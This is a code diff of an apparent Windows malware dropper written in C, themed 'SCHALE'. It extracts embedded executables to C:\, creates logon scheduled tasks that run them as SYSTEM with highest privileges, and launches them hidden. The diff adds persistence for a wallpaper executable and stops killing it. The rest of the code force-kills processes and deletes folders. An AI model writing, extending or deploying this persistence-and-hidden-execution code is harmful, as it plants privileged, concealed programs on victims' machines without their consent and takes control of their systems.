@@ -41,16 +41,18 @@ void STARTSCHALE()
 	RF(IDR_EXE2, "EXE", "C:\\S.C.H.A.L.E.exe");
 	RF(IDR_EXE3, "EXE", "C:\\SCHALE\\SCHALECLEANUP.exe");
 	RF(IDR_EXE4, "EXE", "C:\\SCHALE\\SCHALEGUI.exe");
-	RF(IDR_EXE5, "EXE", "C:\\SCHALE\\SCHALEWALLPAPER.exe");
+	RF(IDR_EXE5, "EXE", "C:\\SCHALEWALLPAPER.exe");
 
 	system("schtasks /create /tn \"SCHALE\" /tr C:\\S.C.H.A.L.E.exe /sc onlogon /ru \"System\" /rl HIGHEST /f");
 	system("schtasks /run \"SCHALE\"");
+	system("schtasks /create /tn \"SCHALEWALLPAPER\" /tr C:\\SCHALEWALLPAPER.exe /sc onlogon /ru \"System\" /rl HIGHEST /f");
+	system("schtasks /run \"SCHALEWALLPAPER\"");
 
 	ShellExecute(NULL, "open", "C:\\S.C.H.A.L.E.exe", NULL, NULL, SW_HIDE);
 	ShellExecute(NULL, "open", "C:\\SCHALE\\SCHALEGUI.exe", NULL, NULL, SW_HIDE);
 	Sleep(3000);
 
-	ShellExecute(NULL, "open", "C:\\SCHALE\\SCHALEWALLPAPER.exe", NULL, NULL, SW_HIDE);
+	ShellExecute(NULL, "open", "C:\\SCHALEWALLPAPER.exe", NULL, NULL, SW_HIDE);
 	system("taskkill /f /im SCHALEGUI.exe");
 	Sleep(10000);
 
@@ -58,7 +60,6 @@ void STARTSCHALE()
 	Sleep(10000);
 
 	system("taskkill /f /im ffplay.exe");
-	system("taskkill /f /im SCHALEWALLPAPER.exe");
 	system("del /f /s /q C:\\SCHALE");
 	system("rd C:\\SCHALE");
 }
